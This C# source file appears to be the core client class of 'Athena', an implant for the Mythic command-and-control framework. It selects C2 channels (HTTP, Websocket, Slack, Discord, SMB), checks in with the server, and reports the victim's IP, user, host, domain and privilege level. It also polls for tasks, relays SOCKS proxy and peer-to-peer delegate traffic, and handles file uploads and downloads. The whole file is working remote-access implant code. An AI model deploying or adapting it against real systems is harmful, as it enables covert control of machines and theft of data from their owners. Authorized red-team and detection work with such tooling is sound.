using Athena.Commands;
using Athena.Commands.Model;
using Athena.Forwarders;
using Athena.Models.Athena.Commands;
using Athena.Models.Mythic.Checkin;
using Athena.Models.Mythic.Tasks;
using Athena.Models.Mythic.Response;
using Athena.Utilities;
using Athena.Plugins;
using Athena.Models.Config;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Linq;
using System.Text.Json;

namespace Athena
{
    public class AthenaClient
    {
        public EventHandler SetSleep;
        public IConfig currentConfig { get; set; }
        public IForwarder forwarder { get; set; }
        public CommandHandler commandHandler { get; set; }
        public SocksHandler socksHandler { get; set; }
        public bool exit { get; set; }
        Dictionary<string, IConfig> availableProfiles { get; set; }
        Dictionary<string, IForwarder> availableForwarders { get; set; }
        public AthenaClient()
        {
            //test
            this.exit = false;
            this.availableProfiles = GetConfigs();
            this.availableForwarders = GetForwarders();
            this.currentConfig = SelectConfig(null);
            this.forwarder = SelectForwarder(null);
  
            this.commandHandler = new CommandHandler();
            this.commandHandler.SetSleepAndJitter += SetSleepAndJitter;
            this.commandHandler.StartForwarder += StartForwarder;
            this.commandHandler.StopForwarder += StopForwarder;
            this.commandHandler.SetForwarder += SetForwarder;
            this.commandHandler.StartSocks += StartSocks;
            this.commandHandler.StopSocks += StopSocks;
            this.commandHandler.ExitRequested += ExitRequested;
            this.commandHandler.SetProfile += SetProfile;

            this.socksHandler = new SocksHandler();
            

        }
        /// <summary>
        /// Select the initial C2 Profile Configuration
        /// </summary>
        /// <param name="choice">The config to switch to, if null a random one will be selected</param>
        private IConfig SelectConfig(string choice)
        {
#if DEBUG
            if(choice is null)
                return availableProfiles.FirstOrDefault().Value;
#endif
            if (String.IsNullOrEmpty(choice))
            {
                Random rand = new Random(); //Select profile at random from available ones
                return availableProfiles.ElementAt(rand.Next(0, availableProfiles.Count)).Value;
            }
            else
            {
                if (this.availableProfiles.ContainsKey($"ATHENA.PROFILES.{choice.ToUpper()}"))
                {
                    //Switch to the requested profile
                    return this.availableProfiles[$"ATHENA.PROFILES.{choice.ToUpper()}"];
                }
                else
                {
                    //Don't make any changes
                    return this.currentConfig;
                }
            }
        }
        /// <summary>
        /// Select the initial SMB Forwarder
        /// </summary>
        /// <param name="choice">The forwarder to switch to, if null a random one will be selected</param>
        private IForwarder SelectForwarder(string choice)
        {
            if (String.IsNullOrEmpty(choice))
            {
                Random rand = new Random(); //Select profile at random from available 
                return availableForwarders.ElementAt(rand.Next(0, availableForwarders.Count)).Value;
            }
            else
            {
                if (this.availableProfiles.ContainsKey((choice)))
                {
                    //Switch to the requested profile
                    return this.availableForwarders[choice];
                }
                else
                {
                    //Don't make any changes
                    return this.forwarder;
                }
            }
        }
        /// <summary>
        /// Get available C2 Profile Configurations
        /// </summary>
        private Dictionary<string, IConfig> GetConfigs()
        {
            List<string> profiles = new List<string>();
            Dictionary<string, IConfig> configs = new Dictionary<string, IConfig>();
#if WEBSOCKET
profiles.Add("Athena.Profiles.Websocket");
#endif
#if HTTP
profiles.Add("Athena.Profiles.HTTP");
#endif
#if SLACK
profiles.Add("Athena.Profiles.Slack");
#endif
#if DISCORD
profiles.Add("Athena.Profiles.Discord");
#endif
#if SMB
profiles.Add("Athena.Profiles.SMB");
#endif

#if NATIVEAOT
            configs.Add(profiles.FirstOrDefault().ToUpper(), new Config());
#else
            foreach (var profile in profiles)
            {
                try
                {
                    Assembly _tasksAsm = Assembly.Load($"{profile}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");

                    if (_tasksAsm == null)
                    {
                        continue;
                    }
                    foreach (Type t in _tasksAsm.GetTypes())
                    {
                        if (typeof(IConfig).IsAssignableFrom(t))
                        {
                            configs.Add(profile.ToUpper(), (IConfig)Activator.CreateInstance(t));
                        }
                    }
                }
                catch
                {
                    
                }
            }
#endif
            return configs;
        }
        /// <summary>
        /// Get available forwarder Configurations
        /// </summary>
        private Dictionary<string, IForwarder> GetForwarders()
        {
            List<string> profiles = new List<string>();
            Dictionary<string, IForwarder> forwarders = new Dictionary<string, IForwarder>();
#if SMBFWD
profiles.Add("Athena.Forwarders.SMB");
#endif
#if EMPTYFWD || DEBUG
            profiles.Add("Athena.Forwarders.Empty");
#endif

#if NATIVEAOT
            forwarders.Add(profiles.FirstOrDefault().ToUpper(), new Forwarder());
#else
            foreach (var profile in profiles)
            {
                try
                {
                    Assembly _tasksAsm = Assembly.Load($"{profile}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");

                    if (_tasksAsm == null)
                    {
                        continue;
                    }
                    foreach (Type t in _tasksAsm.GetTypes())
                    {
                        if (typeof(IForwarder).IsAssignableFrom(t))
                        {
                             forwarders.Add(profile,(IForwarder)Activator.CreateInstance(t));
                        }
                    }
                }
                catch
                {
                    
                }
            }
#endif
            return forwarders;
        }

#region Communication Functions      
        /// <summary>
        /// Performa  check-in with the Mythic server
        /// </summary>
        public async Task<CheckinResponse> CheckIn()
        {
            Checkin ct = new Checkin()
            {
                action = "checkin",
                ip = Dns.GetHostEntry(Dns.GetHostName()).AddressList[0].ToString(),
                os = Environment.OSVersion.ToString(),
                user = Environment.UserName,
                host = Dns.GetHostName(),
                pid = Process.GetCurrentProcess().Id.ToString(),
                uuid = this.currentConfig.profile.uuid,
                architecture = await Misc.GetArch(),
                domain = Environment.UserDomainName,
                integrity_level = Misc.getIntegrity(),
            };
            try
            {

                var responseString = await this.currentConfig.profile.Send(JsonSerializer.Serialize(ct, CheckinJsonContext.Default.Checkin));

                if (String.IsNullOrEmpty(responseString))
                {
                    return null;
                }
                CheckinResponse cs = JsonSerializer.Deserialize(responseString, CheckinResponseJsonContext.Default.CheckinResponse);
                if (cs is null)
                {
                    cs = new CheckinResponse()
                    {
                        status = "failed",
                    };
                }
                return cs;
            }
            catch (Exception e)
            {
                return new CheckinResponse();
            }
        }

        /// <summary>
        /// Perform a get tasking action with the Mythic server to return current responses and check for new tasks
        /// </summary>
        /// <param name="responses">List of ResponseResult objects</param>
        /// <param name="delegateMessages">List of DelegateMessages</param>
        /// <param name="socksMessage">List of SocksMessages</param>
        //public async Task<List<MythicTask>> GetTasks(List<object> responses, List<DelegateMessage> delegateMessages, List<SocksMessage> socksMessage)
        public async Task<List<MythicTask>> GetTasks()
        {
            Task<List<string>> responseTask = this.commandHandler.GetResponses();
            Task<List<DelegateMessage>> delegateTask = this.forwarder.GetMessages();
            Task<List<SocksMessage>> socksTask = this.socksHandler.GetMessages();
            await Task.WhenAll(responseTask, delegateTask, socksTask);

            List<string> responses = await responseTask;

            GetTasking gt = new GetTasking()
            {
                action = "get_tasking",
                tasking_size = -1,
                delegates = await delegateTask,
                socks = await socksTask,
                responses = responses,
            };
            
            try
            {
                string responseString = await this.currentConfig.profile.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking));

                if (String.IsNullOrEmpty(responseString))
                {
                    await this.commandHandler.AddResponse(responses);
                    return null;
                }

                return await HandleGetTaskingResponse(responseString);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                return null;
            }
        }
        /// <summary>
        /// Parse the GetTaskingResponse and forward them to the required places
        /// </summary>
        /// <param name="responseString">Response from the Mythic server</param>
        private async Task<List<MythicTask>> HandleGetTaskingResponse(string responseString)
        {
            GetTaskingResponse gtr = JsonSerializer.Deserialize(responseString, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
            if (gtr is null)
            {
                return null;
            }

            //Pass up socks messages
            if (gtr.socks is not null && gtr.socks.Count > 0)
            {
                try
                {
                    HandleSocks(gtr.socks);
                }
                catch (Exception e)
                {

                }
            }

            if (gtr.delegates is not null && gtr.delegates.Count > 0)
            {
                try
                {
                    HandleDelegates(gtr.delegates);
                }
                catch (Exception e)
                {

                }
            }
            if (gtr.responses is not null)
            {
                try
                {
                    HandleMythicResponses(gtr.responses);
                }
                catch (Exception e)
                {
                }
            }

            return gtr.tasks;
        }
        #endregion
        #region Helper Functions
        /// <summary>
        /// EventHandler to update the sleep and jitter
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
        private void SetSleepAndJitter(object sender, TaskEventArgs e)
        {
            StringBuilder sb = new StringBuilder();
            ResponseResult result = new ResponseResult()
            {
                completed = "true",
                task_id = e.job.task.id
            };
            //var sleepInfo = JsonSerializer.Deserialize<Dictionary<string, string>>(e.job.task.parameters, JsonSerializerOptions.Default);
            Dictionary<string, string> sleepInfo = Misc.ConvertJsonStringToDict(e.job.task.parameters);
            try
            {
                this.currentConfig.sleep = int.Parse(sleepInfo["sleep"]);
                sb.AppendLine($"Updated sleep to: {sleepInfo["sleep"]}");
                this.currentConfig.jitter = int.Parse(sleepInfo["jitter"]);
                sb.AppendLine($"Updated jitter to: {sleepInfo["jitter"]}");
            }
            catch
            {
                sb.AppendLine("Invalid sleep or jitter specified");
                result.status = "error";
            }
            result.user_output = sb.ToString();

            _ = commandHandler.AddResponse(result.ToJson());

        }
        /// <summary>
        /// EventHandler to set the current profile
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">ProfileEventArgs containing the MythicJob object</param>
        private void SetProfile(object sender, ProfileEventArgs e)
        {
            StringBuilder sb = new StringBuilder();
            ResponseResult result = new ResponseResult()
            {
                completed = "true",
                task_id = e.job.task.id,
            };
            //var profileInfo = JsonSerializer.Deserialize<Dictionary<string, object>>(e.job.task.parameters);
            var profileInfo = Misc.ConvertJsonStringToDict(e.job.task.parameters);
            try
            {
                this.currentConfig = SelectConfig(profileInfo["name"]);
                sb.AppendLine($"Updated profile to: {profileInfo["name"]}");
            }
            catch (Exception ex)
            {
                sb.AppendLine("Invalid profile specified" + Environment.NewLine + ex.ToString());
                result.status = "error";
            }
            result.user_output = sb.ToString();

            _ = commandHandler.AddResponse(result.ToJson());
        }
        /// <summary>
        /// EventHandler to set the current forwarder
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">ProfileEventArgs containing the MythicJob object</param>
        private void SetForwarder(object sender, ProfileEventArgs e)
        {
            StringBuilder sb = new StringBuilder();
            ResponseResult result = new ResponseResult()
            {
                completed = "true",
                task_id = e.job.task.id,
            };
            //var profileInfo = JsonSerializer.Deserialize<Dictionary<string, object>>(e.job.task.parameters);
            var profileInfo = Misc.ConvertJsonStringToDict(e.job.task.parameters);
            try
            {
                this.forwarder = SelectForwarder(profileInfo["profile"]);
                sb.AppendLine($"Updated forwarder to: {profileInfo["profile"]}");
            }
            catch
            {
                sb.AppendLine("Invalid forwarder specified");
                result.status = "error";
            }
            result.user_output = sb.ToString();

            _ = commandHandler.AddResponse(result.ToJson());
        }
        /// <summary>
        /// EventHandler to start the forwarder
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
        private void StartForwarder(object sender, TaskEventArgs e)
        {
            var res = this.forwarder.Link(e.job, this.currentConfig.profile.uuid).Result;

            ResponseResult result = new ResponseResult()
            {
                completed = "true",
                task_id = e.job.task.id,
                user_output = res ? "Forwarder started" : "Forwarder failed to start",
            };

            _ = commandHandler.AddResponse(result.ToJson());
        }
        /// <summary>
        /// EventHandler to stop the forwarder
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
        private void StopForwarder(object sender, TaskEventArgs e)
        {
            this.forwarder.Unlink();
            _ = commandHandler.AddResponse(new ResponseResult
            {
                user_output = "Unlinked from agent",
                task_id = e.job.task.id,
                completed = "true",
            }.ToJson());
        }
        /// <summary>
        /// EventHandler to update the Sleep and Jitter
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
        private void StartSocks(object sender, TaskEventArgs e)
        {
            if (this.socksHandler.Start().Result)
            {
                _ = this.commandHandler.AddResponse(new ResponseResult
                {
                    user_output = "Socks Started",
                    completed = "true",
                    task_id = e.job.task.id,
                }.ToJson());
            }
            else
            {
                _ = this.commandHandler.AddResponse(new ResponseResult
                {
                    user_output = "Failed to start socks",
                    completed = "true",
                    task_id = e.job.task.id,
                    status = "error"
                }.ToJson());
            }
        }
        /// <summary>
        /// EventHandler to starts socks forwarder
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
        private void StopSocks(object sender, TaskEventArgs e)
        {
            if (this.socksHandler.Stop().Result)
            {
                _ = this.commandHandler.AddResponse(new ResponseResult
                {
                    user_output = "Socks stopped",
                    completed = "true",
                    task_id = e.job.task.id,
                }.ToJson());
            }
            else
            {
                _ = this.commandHandler.AddResponse(new ResponseResult
                {
                    user_output = "Failed to stop socks",
                    completed = "true",
                    task_id = e.job.task.id,
                    status = "error"
                }.ToJson());
            }
        }
        /// <summary>
        /// EventHandler to stop socks forwarder
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
        private void ExitRequested(object sender, TaskEventArgs e)
        {
            _ = this.commandHandler.AddResponse(new ResponseResult
            {
                user_output = @"Wisdom's daughter walks alone. The mark of Athena burns through Rome",
                completed = "true",
                task_id = e.job.task.id,
            }.ToJson());
            this.exit = true;
        }

        /// <summary>
        /// Handles SOCKS messages received from the Mythic server
        /// </summary>
        /// <param name="socks">List of SocksMessages</param>
        private async Task HandleSocks(List<SocksMessage> socks)
        {
            Task.Run(async() => Parallel.ForEach(socks, async (socks) => {
                this.socksHandler.HandleMessage(socks);
            }
            ));
        }

        /// <summary>
        /// Handle delegate messages received from the Mythic server
        /// </summary>
        /// <param name="delegates">List of DelegateMessages</param>
        private async Task HandleDelegates(List<DelegateMessage> delegates)
        {
            Parallel.ForEach(delegates, async del =>
            {
                await this.forwarder.ForwardDelegateMessage(del);
            });
        }

        /// <summary>
        /// Handle response result messages received from the Mythic server
        /// </summary>
        /// <param name="responses">List of MythicResponseResults</param>
        private async Task HandleMythicResponses(List<MythicResponseResult> responses)
        {
            Parallel.ForEach(responses, async response =>
            {
                if (await this.commandHandler.HasUploadJob(response.task_id))
                {
                    await this.commandHandler.HandleUploadPiece(response);
                }

                if (await this.commandHandler.HasDownloadJob(response.task_id))
                {
                    await this.commandHandler.HandleDownloadPiece(response);
                }
            });
        }

        /// <summary>
        /// Perform initial checkin with the Mythic server
        /// </summary>
        public async Task<CheckinResponse> handleCheckin()
        {
            int maxMissedCheckins = 3;
            int missedCheckins = 0;
            CheckinResponse res = await this.CheckIn();
            //Run in loop, just in case the agent is not able to connect initially to give a chance for network issues to resolve
            while (res == null || res.status != "success")
            {
                //Attempt checkin again
                try
                {
                    //Increment checkins
                    missedCheckins += 1;

                    if (missedCheckins == maxMissedCheckins)
                    {
                        //bye bye
                        Environment.Exit(0);
                    }

                    //Keep Trying
                    res = await this.CheckIn();
                }
                catch (Exception e)
                {
                }
                //Sleep before attempting checkin again
                await Task.Delay(await Misc.GetSleep(this.currentConfig.sleep, this.currentConfig.jitter) * 1000);
            }
            return res;
        }

        /// <summary>
        /// Update the agent information on successful checkin with the Mythic server
        /// </summary>
        /// <param name="res">CheckIn Response</param>
        public async Task<bool> updateAgentInfo(CheckinResponse res)
        {
            try
            {
                foreach(IConfig config in availableProfiles.Values)
                {
                    config.profile.uuid = res.id;
                    if (config.profile.encrypted)
                    {
                        config.profile.crypt = new PSKCrypto(res.id, this.currentConfig.profile.psk);
                    }
                }
                return true;
            }
            catch (Exception e)
            {
                return false;
            }
        }
#endregion
    }
}
